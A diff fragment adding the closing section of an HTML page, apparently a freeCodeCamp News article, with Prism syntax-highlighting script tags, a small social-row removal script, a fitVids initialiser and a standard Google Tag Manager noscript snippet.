+        src="https://cdn.freecodecamp.org/news-assets/prism-1-16-0/prism-php.min.js"></script>
+    <script type="text/javascript"
+        src="https://cdn.freecodecamp.org/news-assets/prism-1-16-0/prism-python.min.js"></script>
+    <script type="text/javascript" src="https://cdn.freecodecamp.org/news-assets/prism-1-16-0/prism-r.min.js"></script>
+    <script type="text/javascript"
+        src="https://cdn.freecodecamp.org/news-assets/prism-1-16-0/prism-ruby.min.js"></script>
+    <script type="text/javascript"
+        src="https://cdn.freecodecamp.org/news-assets/prism-1-16-0/prism-rust.min.js"></script>
+    <script type="text/javascript"
+        src="https://cdn.freecodecamp.org/news-assets/prism-1-16-0/prism-scala.min.js"></script>
+    <script type="text/javascript"
+        src="https://cdn.freecodecamp.org/news-assets/prism-1-16-0/prism-sql.min.js"></script>
+    <script type="text/javascript"
+        src="https://cdn.freecodecamp.org/news-assets/prism-1-16-0/prism-swift.min.js"></script>
+    <script type="text/javascript"
+        src="https://cdn.freecodecamp.org/news-assets/prism-1-16-0/prism-typescript.min.js"></script>
+    <script type="text/javascript"
+        src="https://cdn.freecodecamp.org/news-assets/prism-1-16-0/prism-yaml.min.js"></script>
+
+    <script>
+    // Conditionally remove social-row based on the publication language setting
+    const hideSocialRowList = ['zh-cn'];
+    const socialRow = document.getElementsByClassName('social-row')[0];
+
+    if (hideSocialRowList.includes(`en`)) socialRow.remove();
+</script>
+
+<script>
+    $(document).ready(function () {
+        // Start fitVids
+        var $postContent = $(".post-full-content");
+        $postContent.fitVids();
+        // End fitVids
+    });
+</script>
+
+
+    <!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-5D6RKKP"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+
+</body>
+
+</html>
